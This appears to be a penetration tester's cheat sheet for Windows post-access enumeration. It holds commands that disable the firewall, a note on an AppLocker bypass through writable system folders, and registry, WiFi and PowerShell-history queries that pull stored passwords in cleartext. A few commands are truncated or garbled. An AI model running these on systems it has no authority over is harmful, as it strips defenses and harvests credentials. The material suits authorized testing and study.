# Computer enumeration

## Antivirus

```powershell
# check status of Defender
PS C:\> Get-MpComputerStatus

# List firewall state and current configuration
netsh advfirewall firewall dump
# or 
netsh firewall show state
netsh firewall show config

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
```

## AppLocker

```powershell
# List applocker rules
PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Bypass
# By default, C:\Windows is not blocked, and C:\Windows\Tasks is writtable by any users
```

## Writeable folders

```ps
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

## Registry

```powershell
# search the registry for key names and passwords
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## WiFi

```powershell
# Find AP SSID
netsh wlan show profile

# Get Cleartext Pass
netsh wlan show profile <SSID> key=cle
```

## PowerShell History

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txtpowers
```
